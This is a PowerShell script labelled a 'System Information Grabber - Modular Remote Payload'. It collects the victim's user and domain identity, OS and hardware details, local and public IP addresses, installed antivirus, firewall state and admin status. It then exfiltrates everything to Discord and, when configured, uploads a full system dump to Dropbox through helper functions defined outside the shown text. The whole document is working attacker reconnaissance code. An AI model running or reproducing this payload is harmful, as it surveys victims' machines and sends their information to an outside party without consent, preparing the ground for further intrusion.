# ============================================================
# System Information Grabber - Modular Remote Payload
# ============================================================
# Collects comprehensive system info and sends to Discord
# ============================================================

$sysid = Get-SystemID
$output = "💻 **System Info from $sysid**`n"
$output += "📅 " + (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + "`n"
$output += "=" * 40 + "`n`n"

# Basic Info
$output += "**📍 IDENTITY**`n"
$output += "• Computer: ``$env:COMPUTERNAME```n"
$output += "• User: ``$env:USERNAME```n"
$output += "• Domain: ``$env:USERDOMAIN```n"
$output += "• Profile: ``$env:USERPROFILE```n`n"

# OS Info
$os = Get-CimInstance Win32_OperatingSystem
$output += "**🖥️ OPERATING SYSTEM**`n"
$output += "• OS: ``$($os.Caption)```n"
$output += "• Version: ``$($os.Version)```n"
$output += "• Architecture: ``$($os.OSArchitecture)```n"
$output += "• Install Date: ``$($os.InstallDate)```n`n"

# Hardware
$cpu = Get-CimInstance Win32_Processor | Select-Object -First 1
$ram = [math]::Round($os.TotalVisibleMemorySize/1MB, 2)
$output += "**⚙️ HARDWARE**`n"
$output += "• CPU: ``$($cpu.Name)```n"
$output += "• RAM: ``$ram GB```n"

# Disk
$disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"
$diskFree = [math]::Round($disk.FreeSpace/1GB, 2)
$diskTotal = [math]::Round($disk.Size/1GB, 2)
$output += "• Disk (C:): ``$diskFree GB free / $diskTotal GB```n`n"

# Network
$output += "**🌐 NETWORK**`n"
$ips = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike '*Loopback*' }
foreach ($ip in $ips) {
    $output += "• $($ip.InterfaceAlias): ``$($ip.IPAddress)```n"
}

# Public IP
try {
    $pubIP = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5)
    $output += "• Public IP: ``$pubIP```n"
} catch {}

$output += "`n"

# Security
$output += "**🛡️ SECURITY**`n"
$av = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct 2>$null
if ($av) {
    $output += "• Antivirus: ``$($av.displayName -join ', ')```n"
} else {
    $output += "• Antivirus: ``Not detected```n"
}

$fw = (Get-NetFirewallProfile | Where-Object {$_.Enabled -eq $true}).Name -join ', '
$output += "• Firewall: ``$fw```n"

# Is Admin?
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$output += "• Admin Rights: ``$isAdmin```n"

# Send
Send-Discord $output

# Send detailed info to Dropbox if available
if ($env:DB) {
    $detailed = Get-ComputerInfo | Out-String
    $fileName = "sysinfo_$sysid`_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
    Send-Dropbox $detailed $fileName
}

